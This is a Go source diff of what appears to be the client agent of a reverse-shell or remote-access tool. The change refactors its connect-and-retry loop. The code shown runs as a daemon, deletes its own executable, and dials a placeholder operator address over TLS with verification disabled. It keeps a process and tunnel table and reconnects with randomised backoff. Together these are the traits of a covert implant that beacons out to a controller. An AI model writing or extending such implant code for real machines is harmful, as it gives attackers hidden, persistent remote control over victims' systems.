@@ -300,8 +300,8 @@ func handleConnection(c *Client) {
 // 	io.Copy(src, dst)
 // }
 
-func StartClient() {
-
+// return: need retry
+func StartClient() bool {
 	certBuilder := new(strings.Builder)
 	keyBuilder := new(strings.Builder)
 	crypto.Generate(certBuilder, keyBuilder)
@@ -312,36 +312,39 @@ func StartClient() {
 	cert, err := tls.X509KeyPair(pemContent, keyContent)
 	if err != nil {
 		log.Error("server: loadkeys: %s", err)
-		return
+		return true
 	}
 
 	config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
-	service := "xxx.xxx.xxx.xxx:xxxxx"
-	if hash.MD5(service) == "4d1bf9fd5962f16f6b4b53a387a6d852" {
-		service = "127.0.0.1:13337"
-	}
-	conn, err := tls.Dial("tcp", service, &config)
-	if err != nil {
-		log.Error("client: dial: %s", err)
-		return
-	}
-	defer conn.Close()
+	service := strings.Trim("xxx.xxx.xxx.xxx:xxxxx", " ")
+	if hash.MD5(service) != "4d1bf9fd5962f16f6b4b53a387a6d852" {
+		log.Debug("Connecting to: %s", service)
+		conn, err := tls.Dial("tcp", service, &config)
+		if err != nil {
+			log.Error("client: dial: %s", err)
+			return true
+		}
+		defer conn.Close()
 
-	state := conn.ConnectionState()
-	for _, v := range state.PeerCertificates {
-		x509.MarshalPKIXPublicKey(v.PublicKey)
-	}
+		state := conn.ConnectionState()
+		for _, v := range state.PeerCertificates {
+			x509.MarshalPKIXPublicKey(v.PublicKey)
+		}
 
-	log.Debug("client: handshake: %s", state.HandshakeComplete)
-	log.Debug("client: mutual: %s", state.NegotiatedProtocolIsMutual)
-	log.Success("Secure connection established on %s", conn.RemoteAddr())
+		log.Debug("client: handshake: %s", state.HandshakeComplete)
+		log.Debug("client: mutual: %s", state.NegotiatedProtocolIsMutual)
+		log.Success("Secure connection established on %s", conn.RemoteAddr())
 
-	c := &Client{
-		Conn:    conn,
-		Encoder: gob.NewEncoder(conn),
-		Decoder: gob.NewDecoder(conn),
+		c := &Client{
+			Conn:    conn,
+			Encoder: gob.NewEncoder(conn),
+			Decoder: gob.NewDecoder(conn),
+		}
+		handleConnection(c)
+		return true
+	} else {
+		return false
 	}
-	handleConnection(c)
 }
 
 func RemoveSelfExecutable() {
@@ -369,12 +372,15 @@ func main() {
 	log.Success("daemon started")
 
 	RemoveSelfExecutable()
+
 	message.RegisterGob()
 	backoff = CreateBackOff()
 	processes = map[string]*TermiteProcess{}
 	tunnels = map[string]*net.Conn{}
 	for {
-		StartClient()
+		if !StartClient() {
+			break
+		}
 		add := (int64(rand.Uint64()) % backoff.Current)
 		log.Error("Connect to server failed, sleeping for %d seconds", backoff.Current+add)
 		backoff.Sleep(add)
